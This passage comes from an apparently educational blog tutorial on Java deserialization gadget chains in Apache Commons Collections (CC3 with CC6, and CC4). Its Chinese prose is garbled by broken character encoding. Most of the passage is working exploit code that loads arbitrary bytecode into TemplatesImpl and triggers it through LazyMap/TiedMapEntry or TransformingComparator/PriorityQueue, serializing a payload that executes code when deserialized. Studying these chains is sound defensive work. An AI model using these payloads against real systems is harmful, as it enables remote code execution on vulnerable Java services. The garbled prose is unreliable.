<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å½“ç„¶ä¹Ÿèƒ½å’Œ<code>CC6ç»“åˆ</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç”¨ CC6 é“¾çš„å‰åŠéƒ¨åˆ†é“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3FinalEXP2</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// é˜²æ­¢åœ¨ååºåˆ—åŒ–å‰å¼¹è®¡ç®—å™¨  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazyMap.remove(<span class="hljs-string">&quot;key&quot;</span>);  <br>  <br> <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMap, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>





<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p><code>CC4</code>ç®€å•è¯´å°±æ˜¯æ‰¾äº†æ¡å…¶å®ƒçš„è·¯å®ç°<code>transform</code>æ–¹æ³•</p>
<p>CC4 é“¾ä¸Šå»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œè¿™é‡Œæ‰¾é™¤äº†å®ƒè°è¿˜è°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼š</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">InstantiateTransformer ä¸‹å­˜åœ¨ <span class="hljs-attribute">transform</span>æ–¹æ³•<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>TransformingComparator</code> è¿™ä¸ªç±»ä¸­çš„ <code>compare()</code> æ–¹æ³•è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformingComparator.java </span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å»æ‰¾è°è°ƒç”¨äº†è¿™ä¸ª<code>compare</code>æ–¹æ³•ï¼š</p>
<p><code>riorityQueue</code> è¿™ä¸ªç±»ä¸­çš„ <code>siftDownUsingComparator()</code> æ–¹æ³•è°ƒç”¨äº†ä¹‹å‰çš„ <code>compare()</code> æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.java</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>åŒç±»ä¸‹çš„<code>siftDown</code>è°ƒç”¨äº†è¿™ä¸ª<code>siftDownUsingComparator</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>siftDown</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶åå†é‡å†™çš„<code>PriorityQueue.readObject()</code>å­˜åœ¨è°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>       <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br><br>       s.defaultReadObject();<br><br>       s.readInt();<br><br>       queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>           queue[i] = s.readObject();<br><br>       heapify();<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>é€»è¾‘ï¼š</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject() -&gt;</span> heapify<br>	<span class="hljs-function"><span class="hljs-title">heapify</span> -&gt;</span> siftDown<br>		<span class="hljs-function"><span class="hljs-title">siftDown</span> -&gt;</span>siftDownUsingComparator<br>			<span class="hljs-function"><span class="hljs-title">siftDownUsingComparator</span>-&gt;</span>compare<br>				<span class="hljs-function"><span class="hljs-title">compare</span> -&gt;</span>transformer.transform()<br></code></pre></td></tr></table></figure>

<p>é“¾å­çš„å°¾éƒ¨å°±æ˜¯<code>InstantiateTransformer.transform()</code>ï¼Œè¿™é‡Œç›´æ¥ç”¨å‰é¢<code>CC3</code>é‚£éƒ¨åˆ†å°±è¡Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// æ„é€  InstantiateTransformer.transform çš„ EXPpublic class TransformOriEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br>  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>æŒ‰ç…§å‰é¢çš„é€»è¾‘ï¼ŒæŠŠ<code>instantiateTransformer.transform(TrAXFilter.class); </code>æ¢ä¸ªæ–¹æ³•æ‰§è¡Œï¼š</p>
<p><code>compare</code>æ–¹æ³•å»è°ƒè¿™ä¸ª<code>transform</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComparatorEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç®€å•è¯´å°±æ˜¯ä¸‹é¢è¿™ä¸ªä¸œè¥¿å’Œååºåˆ—åŒ–é…åˆå°±èƒ½è°ƒç”¨<code>instantiateTransformer.transform(TrAXFilter.class);  </code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator); <br></code></pre></td></tr></table></figure>

<p>ä¸ºå•¥å‘¢ï¼Ÿæ³¨æ„è¿™æ®µæ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> &#123;<br>        <span class="hljs-built_in">this</span>(transformer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComparableComparator</span>());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructs an instance with the given Transformer and Comparator.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer  what will transform the arguments to &lt;code&gt;compare&lt;/code&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> decorated  the decorated Comparator</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br><span class="hljs-comment">//åœ¨Javaä¸­ï¼Œé€šè¿‡ä½¿ç”¨ this() å…³é”®å­—å¯ä»¥åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ä¸­è°ƒç”¨åŒä¸€ä¸ªç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°</span><br><span 